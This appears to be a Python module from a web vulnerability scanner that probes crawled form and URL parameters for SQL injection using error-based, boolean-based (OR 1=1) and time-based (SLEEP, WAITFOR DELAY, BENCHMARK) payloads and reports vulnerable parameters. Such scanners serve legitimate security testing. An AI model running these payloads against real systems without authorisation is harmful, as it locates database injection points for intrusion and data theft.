"""
SQLiModule - SQL Injection testing (error-based, time-based, boolean-based).

Tests discovered parameters for SQL injection vulnerabilities using
payloads from the Config class.
"""

import re
import time
from typing import Any, Dict, List, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from core.utils import (
    print_info,
    print_good,
    print_warning,
    print_error,
    print_vuln,
    get_session,
)
from core.config import Config
import logging


class SQLiModule:

    ERROR_MARKERS = [
        "sql syntax", "mysql", "sqlite", "postgresql", "ora-",
        "unclosed quotation mark", "microsoft oledb", "odbc sql server",
        "syntax error", "query failed", "mysql_fetch", "pg_query",
        "warning: mysql", "valid mysql result", "postgresql",
        "sqlite3.OperationalError", "mysql.connector",
        "you have an error in your sql", "mysql_num_rows",
        "supplied argument is not a valid mysql", "mssql", "sql server",
    ]

    BLIND_TRUE_MARKERS = [
        "welcome", "dashboard", "profile", "success", "logged in",
        "account", "settings", "admin",
    ]

    BLIND_FALSE_MARKERS = [
        "invalid", "error", "failed", "denied", "wrong",
        "incorrect", "not found",
    ]

    def __init__(self, scanner):
        self.scanner = scanner
        self.config = scanner.config
        self.payloads = Config.SQL_PAYLOADS

    def run(self, target: str, session=None):
        print_info(f"Running SQL injection tests on {target}...")
        results: Dict[str, Any] = {
            "target": target,
            "vulnerable_params": [],
            "findings": [],
        }

        params = self._extract_params(target, session)
        if not params:
            print_info("No injectable parameters found from spider/forms.")
            self.scanner.scan_data["sqli"] = results
            return results

        print_info(f"Testing {len(params)} parameter(s) for SQL injection...")
        for param_info in params:
            url = param_info.get("url", target)
            param_name = param_info.get("name", "")
            method = param_info.get("method", "GET")

            if not param_name:
                continue

            vuln = self.run_on_params(target, [param_info], session)
            if vuln:
                results["vulnerable_params"].append(param_info)
                results["findings"].extend(vuln)

        self.scanner.scan_data["sqli"] = results
        return results

    def run_on_params(self, target: str, params: List[Dict[str, Any]], session=None) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        if session is None:
            session = get_session()

        for param_info in params:
            url = param_info.get("url", target)
            param_name = param_info.get("name", "")
            method = param_info.get("method", "GET").upper()

            if not param_name:
                continue

            print_info(f"  Testing parameter '{param_name}' on {url}")

            result = self.test_error_based(url, param_name, session, method)
            if result:
                findings.append(result)
                continue

            result = self.test_boolean_based(url, param_name, session, method)
            if result:
                findings.append(result)
                continue

            result = self.test_time_based(url, param_name, session, method)
            if result:
                findings.append(result)

        return findings

    def test_error_based(self, url: str, param: str, session, method: str = "GET") -> Optional[Dict[str, Any]]:
        print_info(f"    Error-based SQLi test on '{param}'...")
        parsed = urlparse(url)

        for payload in self.payloads[:10]:
            try:
                test_url = self._inject_param(url, param, payload, method)
                if method == "GET":
                    resp = session.get(test_url, timeout=self.config.timeout, verify=self.config.verify_tls)
                else:
                    resp = session.post(url, data={param: payload}, timeout=self.config.timeout, verify=self.config.verify_tls)

                body = (resp.text or "").lower()
                for marker in self.ERROR_MARKERS:
                    if marker in body:
                        finding = {
                            "type": "error_based_sqli",
                            "url": url,
                            "param": param,
                            "method": method,
                            "payload": payload,
                            "evidence": marker,
                            "status_code": resp.status_code,
                        }
                        print_vuln(
                            f"SQL injection (error-based) in '{param}' @ {url} | "
                            f"Payload: {payload} | Marker: {marker}"
                        )
                        self.scanner.findings.append(
                            f"[SQLI:ERROR] {url} param={param} payload='{payload}' evidence='{marker}'"
                        )
                        return finding
            except Exception:
                logging.exception("sqli.py: exception", exc_info=True)
                continue
        print_info(f"    No error-based SQLi found for '{param}'.")
        return None

    def test_time_based(self, url: str, param: str, session, method: str = "GET") -> Optional[Dict[str, Any]]:
        print_info(f"    Time-based SQLi test on '{param}'...")
        time_payloads = [
            ("' AND SLEEP(3)--", 3),
            ("' OR SLEEP(3)--", 3),
            ("1' AND SLEEP(3)--", 3),
            ("'; WAITFOR DELAY '0:0:3'--", 3),
            ("1' AND BENCHMARK(5000000,SHA1('test'))--", 3),
        ]

        for payload, delay in time_payloads:
            try:
                test_url = self._inject_param(url, param, payload, method)

                start = time.time()
                if method == "GET":
                    resp = session.get(test_url, timeout=self.config.timeout + delay + 5, verify=self.config.verify_tls)
                else:
                    resp = session.post(url, data={param: payload}, timeout=self.config.timeout + delay + 5, verify=self.config.verify_tls)
                elapsed = time.time() - start

                if elapsed >= delay:
                    finding = {
                        "type": "time_based_sqli",
                        "url": url,
                        "param": param,
                        "method": method,
                        "payload": payload,
                        "elapsed": round(elapsed, 2),
                        "expected_delay": delay,
                        "status_code": resp.status_code,
                    }
                    print_vuln(
                        f"SQL injection (time-based) in '{param}' @ {url} | "
                        f"Payload: {payload} | Delay: {elapsed:.1f}s"
                    )
                    self.scanner.findings.append(
                        f"[SQLI:TIME] {url} param={param} payload='{payload}' delay={elapsed:.1f}s"
                    )
                    return finding
            except Exception:
                logging.exception("sqli.py: exception", exc_info=True)
                continue
        print_info(f"    No time-based SQLi found for '{param}'.")
        return None

    def test_boolean_based(self, url: str, param: str, session, method: str = "GET") -> Optional[Dict[str, Any]]:
        print_info(f"    Boolean-based SQLi test on '{param}'...")
        try:
            baseline_resp = self._make_request(url, param, "test_value_normal_12345", method, session)
            baseline_body = baseline_resp.text or ""
            baseline_length = len(baseline_body)
        except Exception:
            logging.exception("sqli.py: operation failed")
            return None

        true_payloads = ["' OR '1'='1", "' OR 1=1--", "1' OR '1'='1"]
        false_payloads = ["' OR '1'='2", "' OR 1=2--", "1' OR '1'='2"]

        for true_pay, false_pay in zip(true_payloads, false_payloads):
            try:
                true_resp = self._make_request(url, param, true_pay, method, session)
                false_resp = self._make_request(url, param, false_pay, method, session)

                true_body = true_resp.text or ""
                false_body = false_resp.text or ""

                true_len = len(true_body)
                false_len = len(false_body)

                content_differs = abs(true_len - false_len) > max(50, baseline_length * 0.1)
                true_has_keywords = any(kw in true_body.lower() for kw in self.BLIND_TRUE_MARKERS)
                false_has_keywords = any(kw in false_body.lower() for kw in self.BLIND_FALSE_MARKERS)

                if content_differs or (true_has_keywords and false_has_keywords):
                    finding = {
                        "type": "boolean_based_sqli",
                        "url": url,
                        "param": param,
                        "method": method,
                        "true_payload": true_pay,
                        "false_payload": false_pay,
                        "true_length": true_len,
                        "false_length": false_len,
                        "status_code": true_resp.status_code,
                    }
                    print_vuln(
                        f"SQL injection (boolean-based) in '{param}' @ {url} | "
                        f"True: {true_len} bytes, False: {false_len} bytes"
                    )
                    self.scanner.findings.append(
                        f"[SQLI:BOOLEAN] {url} param={param} true_len={true_len} false_len={false_len}"
                    )
                    return finding
            except Exception:
                logging.exception("sqli.py: exception", exc_info=True)
                continue
        print_info(f"    No boolean-based SQLi found for '{param}'.")
        return None

    def _inject_param(self, url: str, param: str, payload: str, method: str = "GET") -> str:
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        qs[param] = [payload]
        new_query = urlencode(qs, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    def _make_request(self, url: str, param: str, payload: str, method: str, session):
        if method == "GET":
            test_url = self._inject_param(url, param, payload, method)
            return session.get(test_url, timeout=self.config.timeout, verify=self.config.verify_tls)
        else:
            return session.post(url, data={param: payload}, timeout=self.config.timeout, verify=self.config.verify_tls)

    def _extract_params(self, target: str, session=None) -> List[Dict[str, Any]]:
        params: List[Dict[str, Any]] = []

        crawl_data = self.scanner.scan_data.get("crawl", {})
        forms = crawl_data.get("forms", [])
        for form in forms:
            form_url = form.get("url", target)
            for fp in form.get("params", []):
                params.append({
                    "url": form_url,
                    "name": fp.get("name", ""),
                    "method": form.get("method", "GET"),
                })

        parsed = urlparse(target)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        for key in qs:
            params.append({
                "url": target,
                "name": key,
                "method": "GET",
            })

        seen = set()
        unique_params = []
        for p in params:
            k = (p["url"], p["name"], p["method"])
            if k not in seen:
                seen.add(k)
                unique_params.append(p)

        return unique_params
